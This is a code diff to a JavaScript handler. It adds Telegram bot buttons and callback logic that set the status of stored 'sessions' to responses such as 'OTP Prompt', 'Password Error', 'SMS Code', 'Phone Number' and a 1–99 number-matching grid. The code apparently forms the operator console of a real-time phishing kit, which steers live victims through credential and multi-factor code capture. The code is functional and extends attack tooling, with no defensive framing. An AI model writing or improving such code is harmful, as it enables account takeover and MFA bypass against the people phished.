@@ -46,6 +46,40 @@ export const handler = async (event) => {
   }
 };
 
+const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+
+function buildOriginalKeyboard(sessionId) {
+  return { inline_keyboard: [
+    [{ text:'🔑 OTP Prompt',    callback_data:`otp_${sessionId}` },      { text:'❌ Password Error', callback_data:`incorrect_${sessionId}` }],
+    [{ text:'📱 SMS Code',      callback_data:`sms_${sessionId}` },       { text:'📞 Phone Number',   callback_data:`phone_${sessionId}` }],
+    [{ text:'🔢 Number Prompt', callback_data:`np_${sessionId}` }],
+    [{ text:'✅ Success',       callback_data:`success_${sessionId}` },   { text:'⚠️ SUA',            callback_data:`sua_${sessionId}` }],
+  ]};
+}
+
+function buildNumberGrid(sessionId) {
+  const rows = [];
+  let row = [];
+  for (let i = 1; i <= 99; i++) {
+    row.push({ text: String(i), callback_data: `n${i}_${sessionId}` });
+    if (row.length === 8) { rows.push(row); row = []; }
+  }
+  if (row.length) rows.push(row);
+  rows.push([{ text: '← Back', callback_data: `back_${sessionId}` }]);
+  return { inline_keyboard: rows };
+}
+
+async function editKeyboard(chatId, messageId, reply_markup) {
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, message_id: messageId, reply_markup }),
+      signal: AbortSignal.timeout(5000),
+    });
+  } catch (e) { console.error('editKeyboard error:', e.message); }
+}
+
 async function processTelegramUpdates() {
   // Get current offset from Supabase
   const offsetRow = await dbSelectOne('telegram_offset', { id: 1 }, 'offset_value').catch(() => null);
@@ -78,32 +112,48 @@ async function processTelegramUpdates() {
 
     console.log('callback_query:', cbData);
 
-    const match = cbData.match(/^([a-z]+)_([a-f0-9]{32})$/);
-    if (!match) {
-      console.error('Regex no match for:', cbData);
-      continue;
+    // Regex: letters + optional digits (handles np, n67, back, otp, etc.)
+    const match = cbData.match(/^([a-z]+\d*)_([a-f0-9]{32})$/);
+    if (!match) { console.error('Regex no match:', cbData); continue; }
+
+    const action    = match[1];
+    const sessionId = match[2];
+    const msgId     = update.callback_query.message?.message_id;
+    const chatId    = update.callback_query.message?.chat?.id;
+
+    // Show number grid
+    if (action === 'np') {
+      if (msgId && chatId) await editKeyboard(chatId, msgId, buildNumberGrid(sessionId));
+      await answerCallback(cbId, 'Select a number'); continue;
     }
 
-    const action       = match[1];
-    const sessionId    = match[2];
+    // Back to original keyboard
+    if (action === 'back') {
+      if (msgId && chatId) await editKeyboard(chatId, msgId, buildOriginalKeyboard(sessionId));
+      await answerCallback(cbId, '← Back'); continue;
+    }
+
+    // Number selected (n1–n99)
+    if (/^n\d+$/.test(action)) {
+      const number = action.substring(1);
+      await dbUpdate('sessions', {
+        status: 'responded', response_type: `number_prompt:${number}`,
+        responded_at: new Date().toISOString(), last_update: new Date().toISOString(),
+      }, { id: sessionId });
+      if (msgId && chatId) await editKeyboard(chatId, msgId, buildOriginalKeyboard(sessionId));
+      console.log(`Session ${sessionId} → number_prompt:${number}`);
+      await answerCallback(cbId, `✅ Number ${number} sent`); continue;
+    }
+
+    // Standard action
     const responseType = COMMAND_MAP[action];
+    if (!responseType) { console.error('Unknown action:', action); continue; }
 
-    if (!responseType) {
-      console.error('Unknown action:', action);
-      continue;
-    }
-
-    // Update session in Supabase
     await dbUpdate('sessions', {
-      status:        'responded',
-      response_type: responseType,
-      responded_at:  new Date().toISOString(),
-      last_update:   new Date().toISOString(),
+      status: 'responded', response_type: responseType,
+      responded_at: new Date().toISOString(), last_update: new Date().toISOString(),
     }, { id: sessionId });
-
     console.log(`Session ${sessionId} → ${responseType}`);
-
-    // Acknowledge the button tap in Telegram
     await answerCallback(cbId, `✅ ${action.charAt(0).toUpperCase() + action.slice(1)} triggered!`);
   }
 
